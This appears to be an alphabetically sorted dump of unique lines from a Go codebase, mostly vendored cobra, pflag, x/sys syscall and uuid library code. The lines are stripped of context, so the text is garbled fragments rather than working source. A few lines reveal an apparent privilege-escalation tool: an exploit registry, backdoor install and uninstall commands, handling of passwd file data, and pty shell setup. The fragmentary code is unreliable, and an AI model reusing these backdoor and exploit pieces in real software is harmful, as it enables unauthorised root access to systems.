[]time.Duration {
[]time.Duration) 
[]uint
[]uint {
[]uint) 
[]uint16)(unsafe.Pointer(
[cobra-slack]: https://gophers.slack.com/archives/CD3LP1199
[http://localhost:6060/pkg/github.com/spf13/pflag][2] after
[len(pp.Path)]byte)(unsafe.Pointer(
[unsafe.Sizeof(TIPCServiceName{})]byte)(unsafe.Pointer(sa)))[:])
[unsafe.Sizeof(TIPCServiceRange{})]byte)(unsafe.Pointer(sa)))[:])
[unsafe.Sizeof(TIPCSocketAddr{})]byte)(unsafe.Pointer(sa)))[:])
[unsafe.Sizeof(dstDirent)]byte)(unsafe.Pointer(
[unsafe.Sizeof(srcDirent)]byte)(unsafe.Pointer(
] is ${words[
] only
]: ${words[
]} ${two_word_flags[
]} -eq 1 ]
_       
_             
_                         [4]byte
_                         [4]uint8
_                        uint32
_                        uintptr
_                       uint32 // pad to 8 byte boundary
_                    [5]uint32
_                   uint8
_                  uint16
_                 [1]byte
_                 [2]byte
_                 [3]byte
_                 byte
_                [4]byte
_               [12]uint64
_               [1]uint16
_               [4]byte
_               uint64
_               uintptr
_              [11]uint64
_              [928]uint8
_              uint32
_             [1]byte
_             [20]byte
_             [2]byte
_             [3]byte
_             [4]byte
_             [7]byte
_             [8]byte
_             uint16
_             uintptr
_            [13]uint32
_            [38]byte
_            [4]byte
_            [4]byte // eye catcher
_            [4]byte // rsrvd1
_            [6]uint32
_            [8]byte
_            uint32
_           [16]byte
_           [1]byte
_           [4]byte
_           [8]uint8
_          [16]byte
_          [4]byte
_          [5]uint32
_          [8]byte
_          uint16
_          uint32
_         [0]int8
_         [0]uint8
_         [24]byte // rsrvd5
_         [28]uint8
_         [2]byte // rsrvd2
_         [44]byte
_         [4]byte
_         [4]byte // rsrvd3
_         [4]byte // rsrvd4
_         [4]uint8
_         [8]int8
_         [8]uint8
_         uint16
_         uint32
_         uint64
_         uintptr
_        [4]byte
_        [8]uint32
_        uint32
_       Timespec
_       [1]byte
_       [2]byte
_       [2]int32
_       [3]byte
_       [3]int64
_       [4]byte
_       [4]uint8
_       [6]byte
_       [8]byte
_       int32
_       uint16
_       uint32
_       uint64
_      [118]int8
_      [118]uint8
_      [122]int8
_      [122]uint8
_      [1]byte
_      [2]byte
_      [32]byte
_      [34]byte
_      [3]byte
_      [40]byte
_      [4]byte
_      [4]uint8
_      [5]byte
_      [7]uint8
_      int16
_      int32
_      uint32
_      uint64
_      uint8
_     [112]byte
_     [116]byte
_     [16]byte
_     [1]byte
_     [4]byte
_     int32
_     uint32
_    [0]uint8
_    [112]uint8 // pad
_    [13]uint64
_    [2]uint8
_    [4]byte
_    [4]byte // pad
_    int32
_    uint16
_    uint32
_    uint64
_  [8]byte
_ = b[1] // bounds check hint to compiler
_ = b[3] // bounds check hint to compiler
_ = b[7] // bounds check hint to compiler
_ = c.MarkFlagRequired(fName)
_ = lockable.Flush()
_ = os.Remove(srcPath)
_ = os.Remove(tempFile.Name())
_ = os.RemoveAll(dir)
_ = p.Close() // Best effort.
_ = pty.Close() // Best effort.
_ = r.Close()
_ = rtlGetVersion(info)
_ = t.Close() // Best effort.
_ = tempFile.Close()
_ = w.Close()
_ [len(ifreq{}.Ifru) - SizeofPtr]byte
_%[1]s()
_(FILTER
_(MAX)
_0      int16
_1      int32
_1      uint16
_<yourProgram>
_ACCEPT      = 5
_ACCEPT4     = 18
_BIND        = 2
_BPX_NONSWAP                    = 2
_BPX_SWAP                       = 1
_CONNECT     = 3
_CPU_SETSIZE = 0x400
_C_SPECNAMELEN = 0x3f
_C_SPECNAMELEN = 0xff
_C_int       int32
_C_int   int32
_C_int  int32
_C_long      int32
_C_long      int64
_C_long int32
_C_long int64
_C_long_long int64
_C_short     int16
_C_short int16
_C_uint uint32
_FDATAFLUSH                   = 0x2000000000
_GETPEERNAME = 7
_GETSOCKNAME = 6
_GETSOCKOPT  = 15
_Gid_t) (err error)
_Gid_t) (err error) = SYS_SETGROUPS32
_Gid_t) (err error) {
_HIDIOCGRAWNAME                  = 0x40804804
_HIDIOCGRAWNAME                  = 0x80804804
_HIDIOCGRAWNAME_LEN                         = 0x80
_HIDIOCGRAWPHYS                  = 0x40404805
_HIDIOCGRAWPHYS                  = 0x80404805
_HIDIOCGRAWPHYS_LEN                         = 0x40
_HIDIOCGRAWUNIQ                  = 0x40404808
_HIDIOCGRAWUNIQ                  = 0x80404808
_HIDIOCGRAWUNIQ_LEN                         = 0x40
_IOC_DIRMASK         = _IOC_VOID 
_IOC_IN      uintptr = 0x80000000
_IOC_IN_OUT  uintptr = _IOC_OUT 
_IOC_OUT     uintptr = 0x40000000
_IOC_PARAM_MASK  = (1 << _IOC_PARAM_SHIFT) - 1
_IOC_PARAM_MASK)<<16 
_IOC_PARAM_SHIFT = 13
_IOC_VOID    uintptr = 0x20000000
_KEY_SIZE)/ 
_LISTEN      = 4
_MAGIC2
_NCPUBITS = 0x20
_NCPUBITS = 0x40
_RECV        = 10
_RECVFROM    = 12
_RECVMMSG    = 19
_RECVMSG     = 17
_SEND        = 9
_SENDMMSG    = 20
_SENDMSG     = 16
_SENDTO      = 11
_SETSOCKOPT  = 14
_SHUTDOWN    = 13
_SOCKET      = 1
_SOCKETPAIR  = 8
_STRING/ {next}
_Socklen) (err error)
_Socklen) (err error) = SYS___GETPEERNAME_A
_Socklen) (err error) = SYS___GETSOCKNAME_A
_Socklen) (err error) = libsocket.__xnet_getsockopt
_Socklen) (err error) = libsocket.getpeername
_Socklen) (err error) = libsocket.getsockname
_Socklen) (err error) {
_Socklen) error {
_]/ 
_][A-Z]
__%[1]s_contains_word()
__%[1]s_debug()
__%[1]s_extract_activeHelp() {
__%[1]s_format_comp_descriptions()
__%[1]s_get_completion_results() {
__%[1]s_handle_command()
__%[1]s_handle_completion_types() {
__%[1]s_handle_filename_extension_flag()
__%[1]s_handle_flag()
__%[1]s_handle_go_custom_completion()
__%[1]s_handle_noun()
__%[1]s_handle_reply()
__%[1]s_handle_special_char()
__%[1]s_handle_standard_completion_case() {
__%[1]s_handle_subdirs_in_dir_flag()
__%[1]s_handle_word()
__%[1]s_index_of_word()
__%[1]s_init_completion()
__%[1]s_process_completion_results() {
__<command-use>_custom_func()
__TIOCFLUSH                      = 0x80047410
__WCOREFLAG$/ {next}
__W[A-Z0-9]
__complete
__getcwd(char 
__getlogin(char 
__kubectl_custom_func()
__kubectl_custom_func() {
__kubectl_customc_func()
__kubectl_get_namespaces
__kubectl_get_namespaces()
__kubectl_get_resource
__kubectl_get_resource()
__kubectl_parse_get
__kubectl_parse_get pod
__kubectl_parse_get()
__posix_chown(const char 
__posix_lchown(const char 
__posix_rename(const char 
__quotactl(const char 
__setlogin(const char 
__sigtimedwait(const sigset_t 
__start_%[1]s()
__sysctl(const int 
_activeHelp_ WARNING: cannot re-use a name that is still in use
_cgo_defun.c
_cgo_export.
_cgo_gotypes.go
_dirblksiz     = 0x400
_errors.c
_go_custom_completion function for
_lwp_continue(lwpid_t target)
_lwp_create(const struct __ucontext 
_lwp_detach(lwpid_t target)
_lwp_exit(void)
_lwp_getprivate(void)
_lwp_park(const struct timespec 
_lwp_self(void)
_lwp_setprivate(void 
_lwp_suspend(lwpid_t target)
_lwp_unpark_all(const lwpid_t 
_lwp_wakeup(lwpid_t target)
_obj
_obj/
_p0          unsafe.Pointer
_p0 := uintptr(unsafe.Pointer(C.CString(oldpath)))
_p0 := uintptr(unsafe.Pointer(C.CString(path)))
_p0 := uintptr(unsafe.Pointer(C.CString(target)))
_p0 = 
_p0 = 1
_p0 = unsafe.Pointer(
_p0)))
_p1 := uintptr(unsafe.Pointer(C.CString(newpath)))
_p1 = 
_p1 = 1
_p1 = len(b)
_p1 = len(buf)
_p1 = len(p)
_p1 = unsafe.Pointer(
_p2 = len(buf)
_p2 = unsafe.Pointer(
_statfsVersion = 0x20140518
_test
_testmain.go
_zero)
_zero))
a := NsecToFiletime(TimespecToNsec(ts[0]))
a := NsecToFiletime(tv[0].Nanoseconds())
a := []string{}
a := data.CompatIDs()
a = a[1:]
a = args
a UUID is a 16 byte array rather than a byte slice.  One loss due to this
a count and a string.
a flag has a NoOptDefVal and the flag is set on the command line without
a=blob
a[0])
a[i] = _Gid_t(v)
abort)
abs_timeout)
absoluteSD = 
absoluteSD = (
abstime)
accType)
acceptCount       uint64
access 
access = GENERIC_READ
access = GENERIC_READ 
access = GENERIC_WRITE
access(const char 
accessEntries[0]
acct(const char 
acct(path 
aceCount    uint16
aclRevision byte
aclSize     uint16
aclp)
acp = uint32(r0)
active map[
active: make(map[
activeHelpCfg := os.Getenv(activeHelpGlobalEnvVar)
activeHelpCfg = os.Getenv(activeHelpEnvVar(cmd.Root().Name()))
activeHelpLevel := cobra.GetActiveHelpConfig(cmd)
activeHelpMarker))
activeHelpMarker}
activeHelp} -ne 0 ]
activeOpen        byte
activeOpened      uint32
actual            map[NormalizedName]
actualVersion := fields[len(fields)-1]
addToLocal := func(f 
addedGoFlagSets []
addr
addr 
addr := 
addr := (
addr = uintptr(r0)
addr uintptr
addr)
addr[0] = pp.Addr[12]
addrerrno<>(SB)
address)
addrs)
adjtime(const struct timeval 
aggressive = true
aiocbp)
aix_ppc)
aix_ppc64)
al := 
al.data = nil
al.pointers = nil
alen)
alias aliasname=origcommand
aliasname
all: fmt test
allExploits := exploits.Get(exploits.SpeedAny)
alloc)).Data
also manually git clone the repository to 
always
an option the flag will be set to the NoOptDefVal. For example given:
analogous to the top-level functions for the command-line
anamelen)
and DCE 1.1: Authentication and Security Services. 
and GOARCH. Generated by mksysnum (see above).
and a wide variety of miscellaneous constants. The constants come from the list
and flags that are only available to that command.
and have each OS upgrade correspond to a single change.
and list 
and one (cmdTimes) is a child of one of the top commands. In this case the root
and then modifying the generated 
and verifying versions against a set of constraints. go-version
and you'll get something like
annotation := make(map[string][]string)
app fetch
app server
app srver
applData          [40]byte
applData      [40]byte
application will follow the following organizational structure:
architecture. This also means that the generated code can differ from system
arg)
arg)))
argWoFlags := c.Flags().Args()
argWoFlags = a
argc)
argp)
args              []string // arguments after flags
args           []string
args   []string
args := c.args
args = args[1:]
args = os.Args[1:]
args []string
args)
arguments can be passed to the kernel. The third is for low-level use by the
argv
argv = (
argv)[:argc] {
argv[0] = unsafe.Pointer(
argv[0] = unsafe.Pointer(uintptr(
argv[1] = unsafe.Pointer(
argv[2] = unsafe.Pointer(
argv[3] = unsafe.Pointer(
argv[4] = unsafe.Pointer(
argv[5] = unsafe.Pointer(
argv[6] = unsafe.Pointer(
as is
asid              uint16
asid          uint16
asm_${GOOS}_${GOARCH}.s
atomic.StorePointer((
attemptFails      uint32
attr = fullattr[s
attr > 0 {
attr)
attr))
attrname)
attrs
attrs 
attrs = FILE_ATTRIBUTE_READONLY
attrs = uint32(r0)
attrs attrs
auditEntries[0]
auditinfo)
auid)
author
authority = (
av := reflect.ValueOf(a)
avalsize)
awk '
b := 
b := m.active[p]
b = b[1:]
b = b[9:]
b = boolValue(v)
b = buf
b)) }
b1 := xvalues[x1]
b2 := xvalues[x2]
b2s := func(arr []byte) string {
b[0]
b[0] != 
b[0] = byte(v)
b[0])
b[0]))
b[1] = byte(v >> 8)
b[2] = byte(v >> 16)
b[3] = byte(v >> 24)
b[4] = byte(v >> 32)
b[5] = byte(v >> 40)
b[6] = byte(v >> 48)
b[7] = byte(v >> 56)
b[cap(b)-1]
b[i] = filenameRunes[rand.Intn(len(filenameRunes))]
b[i] = imageRunes[rand.Intn(len(imageRunes))]
backdoorCmd.AddCommand(backdoorInstallCmd)
backdoorCmd.AddCommand(backdoorUninstallCmd)
backend        frontend       database
backup := string(passwdData)
backup = backup[:4095]
backwards-compatibility with programs that already have their own 
base = uintptr(unsafe.Pointer(
base)
baseLog := logger.New()
based on usage information. Cobra provides a way to completely disable such descriptions by
basep = 
basep = uintptr(base)
basep = uintptr(off)
basep)
basep) == 8 {
bash
bash := 
bash-5.1$ bin/helm install myrelease --version 2.0.[tab]
bash-5.1$ bin/helm install myrelease bitnami/solr --version 2.0.[tab][tab]
bash-5.1$ bin/helm package [tab]
bash-5.1$ bin/helm package [tab][tab]
bash-5.1$ helm repo add [tab]
bash-5.1$ helm repo add grafana [tab]
bash-5.1$ helm repo add grafana https://grafana.github.io/helm-charts [tab]
bash-completion-v2) only). Note that bash 4.4 or higher is required for the prompt to appear when an Active Help message is printed.
bash-completion-v2)).
bash.Flags().BoolVar(
bash_completion
bb := new(bytes.Buffer)
be included in all copies or substantial portions of the
before sending patches.
before this terminator.
beforeErrorBufLen := c.flagErrorBuf.Len()
bg    string
biggestLen := otherPreReleaseLen
biggestLen = selfPreReleaseLen
bin/    internal/    scripts/    pkg/     testdata/
binPath = filepath.Dir(binPath)
binary string
binaryName     string
bit2idx = []int{
bitnami/haproxy
bitnami/harbor
blink
blockp 
blockp := uintptr(unsafe.Pointer(block))
bmatsuo
bold uint8 = 1 << iota
bool {
bool) 
bool) (err error) = IsWow64Process
bool) (err error) = advapi32.GetSecurityDescriptorDacl
bool) (err error) = advapi32.GetSecurityDescriptorGroup
bool) (err error) = advapi32.GetSecurityDescriptorOwner
bool) (err error) = advapi32.GetSecurityDescriptorSacl
bool) (err error) = crypt32.CryptAcquireCertificatePrivateKey
bool) (err error) {
boolSliceValue {
boolSliceValue) Append(val string) error {
boolSliceValue) GetSlice() []string {
boolSliceValue) Replace(val []string) error {
boolSliceValue) Set(val string) error {
boolSliceValue) String() string {
boolSliceValue) Type() string {
boolSliceValue) toString(val bool) string {
boolStrSlice[i] = strconv.FormatBool(b)
boolValue {
boolValue) IsBoolFlag() bool { return true }
boolValue) Set(s string) error {
boolValue) String() string { return strconv.FormatBool(bool(
boolValue) Type() string {
boolValue)(p)
bootstr)
bracketed := parts[0]
branch=master)
branch=master)](https://travis-ci.org/spf13/pflag)
break
break // Only one back quote
break Loop
bs[0])
bs[0]))
bs[0])))
bsv := new(boolSliceValue)
bsv.value = p
bsv.value = val
buf := []byte(mod)
buf := new(bytes.Buffer)
buf = buf[1:]
buf = buf[:len(buf)-1] // remove terminating null
buf = buf[:size]
buf = buf[reclen:]
buf = buf[todo:]
buf)
buf.WriteRune('=')
buf.WriteString(c.BashCompletionFunction 
buf.WriteString(k)
buf.WriteString(strconv.Itoa(v))
bufSize = uint32(r0)
bufW := bufToUTF16(buf)
bufW := data.getBuf()
bufW = bufW[data.compatIDsOffset : data.compatIDsOffset
buf[0]
buf[0] 
buf[0])
buf[0]))
buf[0])) 
buf[0])))
buf[0]))}
buf[i] = byte(val 
buf[i] = byte(val%10 
buf[i].convertFrom(
buf[len(buf)-1] = 0
bufferAlet)
bufferLen)
bufsize      uintptr
bufsize = unsafe.Sizeof(Statfs_t{}) 
bufsize = unsafe.Sizeof(statfs_freebsd11_t{}) 
build !aix
build !go1.12
build !go1.4
build !go1.5
build !js
build !ppc64
build !ppc64le
build !windows
build 386
build 386 amd64
build 386 amd64 amd64p32 alpha arm arm64 loong64 mipsle mips64le mips64p32le nios2 ppc64le riscv riscv64 sh
build 386 amd64 arm arm64
build 386 amd64 arm arm64 mips64
build 386 amd64 mips mipsle mips64 mipsle ppc64 ppc64le ppc s390x sparc64
build aix
build aix darwin dragonfly freebsd linux netbsd openbsd solaris
build aix darwin dragonfly freebsd linux netbsd openbsd solaris zos
build aix darwin freebsd linux netbsd openbsd solaris zos
build aix dragonfly freebsd linux netbsd openbsd
build aix linux solaris zos
build amd64
build arm
build arm arm64
build arm64
build armbe arm64be m68k mips mips64 mips64p32 ppc ppc64 s390 s390x shbe sparc sparc64
build darwin
build darwin dragonfly freebsd linux netbsd openbsd solaris
build darwin dragonfly freebsd netbsd openbsd
build darwin freebsd netbsd openbsd
build dragonfly
build dragonfly freebsd linux netbsd openbsd
build freebsd
build freebsd netbsd
build freebsd netbsd openbsd
build gc
build gccgo
build generate
build go1.12
build go1.13
build go1.4
build go1.5
build go1.9
build ios
build js
build linux
build loong64
build mips mips64
build mips mipsle
build mips mipsle mips64 mips64le
build mips64 mips64le
build mipsle mips64le
build netbsd
build openbsd
build plan9
build ppc64
build ppc64 ppc64le
build ppc64le
build ppc64le ppc64
build riscv riscv64
build riscv64
build s390x
build solaris
build windows
build zos
build-travis: test
build:
build: test
buildNumber 
buildNumber)
buildSecurityDescriptor(owner 
bulkDataIntfName  [16]byte
bv := reflect.ValueOf(b)
by not providing a 'Run' for the 'rootCmd'.
byte
byte {
byte)
byte) (err error)
byte) (err error) = advapi32.ChangeServiceConfig2W
byte) (err error) = advapi32.CryptGenRandom
byte) (err error) = advapi32.ReportEventW
byte) (err error) = kernel32.GetFileAttributesExW
byte) (err error) = kernel32.ReadConsoleW
byte) (err error) = kernel32.WriteConsoleW
byte) (err error) [failretval==socket_error] = ws2_32.WSARecv
byte) (err error) [failretval==socket_error] = ws2_32.WSARecvFrom
byte) (err error) [failretval==socket_error] = ws2_32.WSASend
byte) (err error) [failretval==socket_error] = ws2_32.WSASendTo
byte) (err error) {
byte) (h 
byte) (neterr error) = netapi32.NetApiBufferFree
byte) (neterr error) = netapi32.NetUserGetInfo
byte) (neterr error) {
byte) (p 
byte) (s 
byte) (status error) = dnsapi.DnsQuery_W
byte) (status error) {
byte) = ntdll.RtlInitString
byte) error {
byte) int32
byte) string {
byte) unsafe.Pointer
byte) {
byte)(ptr)
byte)(ptr) != 0
byte)(unsafe.Pointer(
byte)(unsafe.Pointer(peExt.fobj.Name)))
byte)(unsafe.Pointer(ptr))
byte)(unsafe.Pointer(rsa))
byte][]byte // active mappings
bytes := (
bytes.Buffer
bytes.Buffer{}
bytesBase64 = bin
bytesBase64Value {
bytesBase64Value) Set(value string) error {
bytesBase64Value) Type() string {
bytesBase64Value)(p)
bytesHex = bin
bytesHexValue {
bytesHexValue) Set(value string) error {
bytesHexValue) Type() string {
bytesHexValue)(p)
bytesIn           [8]byte  // uint64
bytesNeeded uint32
bytesOut          [8]byte  // uint64
c      io.ReadWriter
c := 0
c := flag.Shorthand[0]
c := name[0]
c := shorthands[0]
c = cmd
c.AddCommand(c.helpCommand)
c.AddCommand(completeCmd)
c.AddCommand(completionCmd)
c.Flags().AddFlagSet(c.PersistentFlags())
c.Flags().AddFlagSet(c.parentsPflags)
c.Flags().ParseErrorsWhitelist = flag.ParseErrorsWhitelist(c.FParseErrWhitelist)
c.Flags().SetNormalizeFunc(n)
c.Flags().VisitAll(addToLocal)
c.Flags().VisitAll(func(pflag 
c.InitDefaultHelpCmd()
c.InitDefaultHelpFlag()
c.InitDefaultVersionFlag()
c.LocalFlags().VisitAll(func(f 
c.Parent().VisitParents(fn)
c.PersistentFlags().SetNormalizeFunc(n)
c.PersistentFlags().VisitAll(addToLocal)
c.Print(MousetrapHelpText)
c.Print(c.flagErrorBuf.String())
c.Print(fmt.Sprintln(i...))
c.PrintErr(fmt.Sprintln(i...))
c.PrintErrln(err)
c.Println(cmd.UsageString())
c.Println(err)
c.Println(x.Name())
c.Println(x.flagErrorBuf)
c.RemoveCommand(c.helpCommand)
c.RemoveCommand(completeCmd)
c.Root().PersistentFlags().AddFlagSet(flag.CommandLine)
c.Stderr = tty
c.Stdin = tty
c.Stdout = tty
c.SuggestionsMinimumDistance = 2
c.SysProcAttr = attrs
c.VisitParents(func(parent 
c.args = a
c.commandCalledAs.name = alias
c.commandCalledAs.name = c.Name()
c.commands = commands
c.commands = nil
c.commandsAreSorted = false
c.commandsAreSorted = true
c.commandsMaxCommandPathLen = 0
c.commandsMaxCommandPathLen = commandPathLen
c.commandsMaxNameLen = 0
c.commandsMaxNameLen = nameLen
c.commandsMaxUseLen = 0
c.commandsMaxUseLen = usageLen
c.ctx = context.Background()
c.ctx = ctx
c.errWriter = bb
c.errWriter = newErr
c.errWriter = output
c.errWriter = tmpErr
c.flagErrorBuf = new(bytes.Buffer)
c.flagErrorBuf.Reset()
c.flagErrorFunc = f
c.flags.SetOutput(c.flagErrorBuf)
c.globNormFunc = n
c.helpCommand = 
c.helpCommand = cmd
c.helpCommand = nil
c.helpFunc = f
c.helpTemplate = s
c.iflags = nil
c.iflags.AddFlag(f)
c.iflags.SetNormalizeFunc(c.globNormFunc)
c.iflags.SetOutput(c.flagErrorBuf)
c.inReader = newIn
c.initCompleteCmd(args)
c.initDefaultCompletionCmd()
c.lflags = nil
c.lflags.AddFlag(f)
c.lflags.SetNormalizeFunc(c.globNormFunc)
c.lflags.SetOutput(c.flagErrorBuf)
c.lflags.SortFlags = c.Flags().SortFlags
c.mergePersistentFlags()
c.outWriter = bb
c.outWriter = newOut
c.outWriter = output
c.outWriter = tmpOutput
c.parent = nil
c.parentsPflags = nil
c.parentsPflags.AddFlagSet(parent.PersistentFlags())
c.parentsPflags.SetNormalizeFunc(c.globNormFunc)
c.parentsPflags.SetOutput(c.flagErrorBuf)
c.parentsPflags.SortFlags = false
c.parentsPflags.VisitAll(func(f 
c.pflags.SetOutput(c.flagErrorBuf)
c.preRun()
c.updateParentsPflags()
c.usageFunc = f
c.usageTemplate = s
c.versionTemplate = s
c5H38=
cELY56d0sOhbIHVSmpZml7NOfgF4K2sLqkT
call dispatch. There are three entry points:
call the command store the output in $out and redirect stderr and stdout to null
called bool
callerFreeProvOrNCryptKey = _p0 != 0
callerFreeProvOrNCryptKey {
callexit(code)
callsync()
can use GetInt() to get the int value. But notice that 'flagname' must exist
canDoSearchSystem32Once.Do(initCanDoSearchSystem32)
cap  int
capArSizeMax       = capRightsGoVersion 
capArSizeMin       = CAP_RIGHTS_VERSION_00 
capRightsGoVersion = CAP_RIGHTS_VERSION_00
case 
case !cPre 
case $GOOS in
case '
case 'A':
case 'B':
case 'C':
case 'D':
case 'F':
case 'H':
case (uuid[8] 
case -1:
case 0:
case 10:
case 11:
case 11: // 
case 12:
case 12: // 
case 13:
case 14:
case 14: // 
case 15:
case 16: // 
case 1:
case 1: // 
case 23: // 
case 2:
case 2: // 
case 32:
case 32: // xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
case 36 
case 36:
case 36: // xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
case 3:
case 4:
case 5:
case 5: // 
case 6:
case 6: // 
case 7:
case 8:
case 8: // 
case 9:
case <-timer.C:
case AF_BLUETOOTH:
case AF_CAN:
case AF_INET6:
case AF_INET:
case AF_IUCV:
case AF_LINK:
case AF_NETLINK:
case AF_NFC:
case AF_PACKET:
case AF_PPPOX:
case AF_SYSTEM:
case AF_TIPC:
case AF_UNIX:
case AF_VSOCK:
case AF_XDP:
case Alpine:
case Arch:
case BTPROTO_L2CAP:
case BTPROTO_RFCOMM:
case BashCompCustom:
case BashCompFilenameExt:
case BashCompOneRequiredFlag:
case BashCompSubdirsInDir:
case CAN_J1939:
case ContinueOnError:
case DEVPROP_TYPE_STRING:
case EAGAIN:
case EINVAL:
case ENOENT:
case EPOLL_CTL_ADD:
case EPOLL_CTL_DEL:
case EPOLL_CTL_MOD:
case ERROR_INSUFFICIENT_BUFFER:
case ExitOnError:
case Future:
case Group:
case IO_REPARSE_TAG_MOUNT_POINT:
case IO_REPARSE_TAG_SYMLINK:
case IPPROTO_L2TP:
case Invalid:
case LOCK_EX 
case LOCK_EX:
case LOCK_SH 
case LOCK_UN:
case Microsoft:
case NFC_SOCKPROTO_LLCP:
case NFC_SOCKPROTO_RAW:
case O_RDONLY:
case O_RDWR:
case O_WRONLY:
case Org:
case PORT_SOURCE_FD:
case PORT_SOURCE_FILE:
case PanicOnError:
case Person:
case REG_BINARY:
case REG_DWORD_BIG_ENDIAN:
case REG_DWORD_LITTLE_ENDIAN:
case REG_EXPAND_SZ:
case REG_MULTI_SZ:
case REG_QWORD_LITTLE_ENDIAN:
case REG_SZ:
case RFC4122:
case Reserved:
case ResourceID:
case TIPC_SERVICE_ADDR:
case TIPC_SERVICE_RANGE:
case TIPC_SOCKET_ADDR:
case []byte:
case boolFlag:
case c == 'h':
case cPre 
case err := <-errChan:
case errnoERROR_IO_PENDING:
case f.ParseErrorsWhitelist.UnknownFlags:
case inEscapeSeq:
case inFlag:
case isFlagArg(arg):
case keyAltLeft:
case keyAltRight:
case keyBackspace:
case keyClearScreen:
case keyCtrlD:
case keyCtrlU:
case keyDeleteLine:
case keyDeleteWord:
case keyDown:
case keyEnd:
case keyEnter:
case keyHome:
case keyLeft:
case keyRight:
case keyUp:
case len(t.line) == 0 
case m.Header.Level == SOL_IP 
case m.Header.Level == SOL_IPV6 
case major == 5 
case major > 5:
case minor == 10 
case minor == 15 
case minor == 16 
case minor > 16:
case mode
case nil:
case nwmICMPGStatsEntry:
case nwmICMPTStatsEntry:
case nwmIPGStatsIdentifier:
case nwmIPStatsIdentifier:
case nwmTCPStatsIdentifier:
case nwmUDPStatsIdentifier:
case r == '
case reflect.String:
case string:
case width < oldWidth:
case width == oldWidth:
case width > oldWidth:
cat <<EOF
cat _error.out 
cert = (
certchain = (
cest)
cfgEphemDef       uint16
cfgFile     string
ch <- syscall.SIGWINCH // Initial resize.
change = unsafe.Pointer(
change is the ability to represent an invalid UUID (vs a NIL UUID).
changed bool
changes[0])
char 
chars := stringFromGUID2(
chars = int32(r0)
chars = uint32(r0)
chdir(const char 
chdir(path string) (err error)
check    
checkout
chflags(const char 
chmod 
chmod(const char 
chown(const char 
chroot(const char 
cid := (
cid[0] = byte(sa.CID)
cid[1] = byte(sa.CID >> 8)
className = UTF16ToString(classNameUTF16[:])
clean:
client   
clientUserId      [8]byte
clockSeq = ((clockSeq 
clockSeq = uint16(seq
clockSeq uint16 // clock sequence for this run
clock_id)
close(int fd)
closedir(dir uintptr) (err error)
clp = 
clsidFromString(lpsz 
clusterConnFlag   byte
cmd 
cmd := 
cmd := c.findNext(arg)
cmd := c.findNext(nextSubCmd)
cmd := exec.Cmd{
cmd = (
cmd = c.Root()
cmd.Execute()
cmd.Flags().AddFlag(flag)
cmd.InheritedFlags().VisitAll(func(flag 
cmd.InitDefaultHelpFlag() // make possible 'help' flag to be shown
cmd.MarkFlagDirname(flag)
cmd.MarkFlagDirname(flagName)
cmd.MarkZshCompPositionalArgumentFile()
cmd.MarkZshCompPositionalArgumentWords()
cmd.NonInheritedFlags().VisitAll(func(flag 
cmd.Root().GenBashCompletion(os.Stdout)
cmd.Root().GenPowerShellCompletionWithDesc(os.Stdout)
cmd.Root().GenZshCompletion(os.Stdout)
cmd.SetHelpCommand(cmd 
cmd.SetHelpFunc(f func(
cmd.SetHelpTemplate(s string)
cmd.SetUsageFunc(f func(
cmd.SetUsageTemplate(s string)
cmd.SetVersionTemplate(s string)
cmd.SysProcAttr = 
cmd.SysProcAttr.Setctty = true
cmd.SysProcAttr.Setsid = true
cmd.ValidArgsFunction(...)
cmd.commandCalledAs.called = true
cmd.commandCalledAs.name = cmd.Name()
cmd.commandCalledAs.name = next
cmd.ctx = c.ctx
cmd/completion.go
cmdlineLen
cmdlineLen := len(cmdline)
cmds := 
cmds[i].parent = c
cmsg.Len = int32(length)
cmsg.Len = uint32(length)
cmsg.Len = uint64(length)
cntThreads          uint32
cntUsage            uint32
coCreateGuid(pguid 
cobra Slack channel][cobra-slack]
cobra slack channel](https://gophers.slack.com/archives/CD3LP1199) and an Issue on Github.
cobra slack channel](https://gophers.slack.com/archives/CD3LP1199) as the primary means of communication with the community. This is to foster open communication with all users and contributors.
cobra-cli
cobra-cli add completion
cobra.AppendActiveHelp(...)
cobra.CheckErr(err)
cobra.Command
cobra.Command{
cobra.CompError(msg string)
cobra.CompErrorln(msg string)
cobra.GetActiveHelpConfig(cmd)
cobra.OnInitialize(initConfig)
cobra.ShellCompDirective
cobra.ShellCompDirectiveNoSpace 
cobra.test
code.google.com/p/go-uuid).  It differs from these earlier packages in that
cols
command
command := cobra.Command{
command := v.entry.Command
command = binaryPath
command and flag definitions are needed.
command it's assigned to as well as every command under that command. For
command.DisableSuggestions = true
command.GenFishCompletion()
command.GenFishCompletionFile()
command.GenPowerShellCompletion()
command.GenPowerShellCompletionFile()
command.GenPowerShellCompletionFileWithDesc()
command.GenPowerShellCompletionWithDesc()
command.RegisterFlagCompletionFunc()
command.SetGlobalNormalizationFunc(n)
command.SuggestionsMinimumDistance = 1
command.parent = nil
commandCalledAs struct {
commandLine 
commandName := cmd.CommandPath()
commandPathLen := len(command.CommandPath())
commandPathLen := len(x.CommandPath())
commandSection := false
commandSection = true
commands := []
commands := []string{}
commands []
commands you want. It's the easiest way to incorporate Cobra into your application.
commandsAreSorted bool
commandsMaxCommandPathLen int
commandsMaxNameLen        int
commandsMaxUseLen         int
comp = strings.TrimSpace(comp)
compCmd := ShellCompRequestCmd
compCmd = ShellCompNoDescRequestCmd
compCmdNoDescFlagDefault = false
compatIDsLength uint32
compatIDsOffset uint32
compdef %[1]s
complete -c %[2]s -e
complete -c %[2]s -n '__%[1]s_prepare_completions' -f -a '$__%[1]s_comp_results'
complete -o default -F __start_origcommand aliasname
completeCmd := 
completion
completion     firstcommand   secondcommand
completion V2 solution which provides the following extra features:
completionCmd := 
completionFn = finalCmd.ValidArgsFunction
completionFn = flagCompletionFunctions[flag]
completions} -ne 0 ] 
components of the build system change.
comp}
comp} 
comp} - 4 ))
comp}>longest))
congestionWnd     uint32
conn := (
conn.inOldestTime[0])))
conn.lastActivity[0])))
conn.outOldestTime[0])))
connClosed        uint32
connFloods        uint32
connStalls        uint32
connectExFunc.once.Do(func() {
const 
const (
const ALL_PROCESSOR_GROUPS = 0xFFFF
const DEVPROPID_FIRST_USABLE DEVPROPID = 2
const GAA_FLAG_INCLUDE_PREFIX = 0x00000010
const ImplementsGetwd = true
const MAXLEN_IFDESCR = 256
const MAXLEN_PHYSADDR = 8
const MAX_ADAPTER_ADDRESS_LENGTH = 8
const MAX_ADAPTER_DESCRIPTION_LENGTH = 128
const MAX_ADAPTER_NAME_LENGTH = 256
